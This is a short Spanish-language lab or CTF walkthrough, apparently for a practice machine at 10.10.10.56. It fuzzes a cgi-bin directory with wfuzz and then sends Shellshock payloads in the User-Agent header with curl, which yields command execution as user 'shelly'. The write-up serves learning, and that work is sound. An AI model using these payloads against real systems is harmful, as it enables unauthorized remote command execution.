## Vulnerability Assessment {-}

### ShellShock attack {-}

1. creamos un diccionario de extensiones

    ```bash
    nano extension.txt

    sh
    pl
    py
    cgi
    ```

1. lanzamos nuevamente wfuzz con la extension

    ```bash
    wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extension.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
    ```

Como aqui hemos encontrado un fichero `user.sh` lanzamos un curl para ver lo que es.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
```

Ya podemos lanzar el ataque shellshock cambiando la cabezera User-Agent.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /usr/bin/whoami"
```

Vemos la respuesta shelly quiere decir que estamos en capacidad de ejecutar commandos a nivel de systema, gracias a esta vulnerabilidad.